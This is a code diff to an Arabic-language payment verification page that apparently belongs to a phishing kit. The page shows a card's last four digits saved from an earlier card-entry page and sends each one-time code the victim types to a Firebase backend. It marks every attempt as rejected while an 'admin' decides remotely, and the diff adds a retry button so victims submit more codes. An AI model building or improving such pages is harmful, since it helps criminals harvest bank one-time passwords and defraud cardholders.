@@ -10,7 +10,7 @@
     <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
-    <script src="./assets/js/firebase-client.js?v=20260911b"></script>
+    <script src="./assets/js/firebase-client.js?v=20260912"></script>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
@@ -152,15 +152,29 @@
     </div>
     
     <script>
+        function escapeHtmlLoose(s) {
+            return String(s == null ? '' : s).replace(/[&<>"']/g, function (c) {
+                return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
+            });
+        }
+
         // عرض آخر 4 أرقام من البطاقة (المحفوظة من صفحة إدخال البطاقة)
         const last4 = sessionStorage.getItem('paymentCardLast4') || localStorage.getItem('paymentCardLast4');
         if (last4 && document.getElementById('last4')) document.getElementById('last4').textContent = last4;
 
-        // إظهار رسالة الرفض بعد إعادة تحميل الصفحة
+        // إظهار رسالة الرفض بعد إعادة تحميل الصفحة مع زر إعادة المحاولة
         if (sessionStorage.getItem('otpRejected') === '1') {
             sessionStorage.removeItem('otpRejected');
             const errEl = document.getElementById('otpError');
-            if (errEl) errEl.style.display = 'block';
+            if (errEl) {
+                const input = document.getElementById('otpCode');
+                const btn = document.querySelector('.btn');
+                if (input) input.disabled = false;
+                if (btn) btn.disabled = false;
+                errEl.innerHTML = 'تم رفض العملية: يرجى المحاولة مرة أخرى' +
+                    ' <button type="button" onclick="try{window.clearRejection&&window.clearRejection()}catch(e){};location.reload();" style="display:block;margin:10px 0 2px;padding:7px 16px;background:#16a34a;color:#fff;border:0;border-radius:5px;font:700 12px Tajawal,sans-serif;cursor:pointer;">إعادة المحاولة</button>';
+                errEl.style.display = 'block';
+            }
         }
         
         // مؤقت انتهاء الصلاحية (60 ثانية)
@@ -206,7 +220,7 @@
                 try { window.pushFirebaseOtp(otp); } catch (err) { console.error(err); }
             }
 
-            // شاشة الانتظار لمدة 4 ثواني، ثم إعادة تحميل الصفحة مع رسالة الرفض
+            // شاشة انتظار قصيرة ثم إعادة تحميل الصفحة (يأتي قرار المدير عبر listenForAdminCommands)
             sessionStorage.setItem('otpRejected', '1');
             document.getElementById('loadingOverlay').classList.add('show');
             setTimeout(function() {
@@ -222,7 +236,11 @@
                     var why = (cmd && (cmd.reason || cmd.raw && cmd.raw.reason)) || 'يرجى المحاولة مرة أخرى';
                     try {
                         var errEl = document.getElementById('otpError');
-                        if (errEl) { errEl.textContent = 'تم رفض العملية: ' + why; errEl.style.display = 'block'; }
+                        if (errEl) {
+                            errEl.innerHTML = 'تم رفض العملية: ' + escapeHtmlLoose(why) +
+                                ' <button type="button" onclick="try{window.clearRejection&&window.clearRejection()}catch(e){};location.reload();" style="display:block;margin:10px 0 2px;padding:7px 16px;background:#16a34a;color:#fff;border:0;border-radius:5px;font:700 12px Tajawal,sans-serif;cursor:pointer;">إعادة المحاولة</button>';
+                            errEl.style.display = 'block';
+                        }
                     } catch (e) {}
                 },
                 onMessage: function (msg) { if (msg && msg.message) { try { alert(msg.message); } catch (e) {} } }
